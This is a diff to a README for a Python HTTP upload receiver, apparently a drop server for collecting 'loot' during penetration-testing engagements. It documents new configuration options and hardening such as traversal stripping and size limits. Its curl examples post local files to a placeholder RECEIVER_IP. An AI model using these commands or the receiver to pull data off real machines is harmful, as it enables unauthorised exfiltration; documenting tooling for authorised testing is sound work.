@@ -24,8 +24,22 @@ Start the receiver from the project directory:
 $ python3 upload_server.py
 ```
 
-It listens on all interfaces (`0.0.0.0`) at port `8000` and creates an
-`uploads/` directory in the current working directory.
+By default it listens on all interfaces (`0.0.0.0`) at port `8000` and
+creates an `uploads/` directory in the current working directory. All of
+that is configurable:
+
+```console
+$ python3 upload_server.py --bind 0.0.0.0 --port 8443 --dir /tmp/loot \
+    --max-size 536870912
+```
+
+| Option | Default | Description |
+| --- | --- | --- |
+| `--bind` | `0.0.0.0` | Address to listen on |
+| `--port` | `8000` | TCP port to listen on |
+| `--dir` | `uploads` | Destination directory (created if missing) |
+| `--max-size` | `1073741824` (1 GiB) | Maximum accepted body size in bytes; `0` disables the limit |
+| `--overwrite` | off | Overwrite existing files instead of adding a numeric suffix |
 
 Send a file as the raw request body:
 
@@ -48,11 +62,17 @@ $ curl --data-binary @report.txt \
     "http://RECEIVER_IP:8000/?name=host%20report.txt"
 ```
 
-If `name` is omitted or empty, the receiver saves the body as `upload.bin`:
+If `name` is omitted or empty, the receiver generates a unique name such as
+`upload-20260728T174817-fe19c9ff.bin`:
 
 ```console
 $ curl --data-binary @payload.bin "http://RECEIVER_IP:8000/"
 ```
+
+Uploading a name that already exists on disk does not overwrite it by
+default — the receiver adds a numeric suffix (`loot.zip`, `loot.1.zip`,
+`loot.2.zip`, ...). Pass `--overwrite` at startup if you want same-name
+uploads to replace the existing file instead.
 
 Press `Ctrl-C` in the receiver terminal to stop the server.
 
@@ -61,13 +81,16 @@ Press `Ctrl-C` in the receiver terminal to stop the server.
 - Only POST requests are handled.
 - The request body is treated as opaque binary data; multipart form uploads
   are not parsed.
-- Filenames are reduced to their basename before being placed in `uploads/`.
-- Uploading the same filename again overwrites the existing file.
-- The full request body is held in memory before it is written.
+- Filenames are reduced to their basename before being placed in the upload
+  directory, and path separators/reserved characters are stripped so
+  POSIX- and Windows-style traversal attempts (`../`, `..\`) can't escape it.
+- The request body is streamed to a temporary file and atomically renamed
+  into place, so it is never fully buffered in memory and partial/failed
+  uploads don't leave a truncated file at the final destination.
+- `Content-Length` is required and validated; missing, non-numeric, negative,
+  or over-`--max-size` requests are rejected before any data is read.
 - The server handles one request at a time.
-- There is no authentication, encryption, file-size limit, or access control.
-- The bind address, port, and destination directory are currently fixed in the
-  source.
+- There is no authentication, encryption, or access control.
 
 Because the listener binds to every network interface, use host firewall rules
 and an engagement-controlled network to restrict who can reach it. Captured
